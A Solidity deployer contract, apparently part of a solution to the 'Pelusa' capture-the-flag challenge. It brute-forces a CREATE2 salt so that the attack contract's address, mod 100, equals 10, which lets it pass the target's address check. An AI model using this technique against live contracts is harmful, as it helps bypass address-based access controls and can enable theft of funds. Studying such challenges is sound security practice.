// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "./attack_pelusa.sol";

contract deployattackpelusa {
    attack_pelusa public attackpelusacontract;
    attack_pelusa public attack_pelusacontract;

    // the attackpelusa contract take the _pelusacontractaddress as aparameter in its constructor, so we will use it here.
    constructor(address _pelusacontractaddress) {
        bytes32 salt = computesalt(_pelusacontractaddress); 
        attack_pelusacontract = new attack_pelusa{ salt: bytes32(salt) }(_pelusacontractaddress); 
    }


    function computesalt(address _pelusacontractaddress) private view returns (bytes32) {
        uint256 salt = 0;
        bytes32 hash = keccak256(abi.encodePacked(type(attack_pelusa).creationCode, abi.encode(_pelusacontractaddress)));
        // loop until we found the address to be dividable 100 = 10 then break.
        while (true) {
            bytes32 addresshash = keccak256(abi.encodePacked(bytes1(0xff), address(this), bytes32(salt), hash));
            if (uint160(uint256(addresshash)) % 100 == 10) {
                break;
            }
           salt += 1;
        }
        return bytes32(salt); // return the salt which satisfied the condition we needed
    }
}
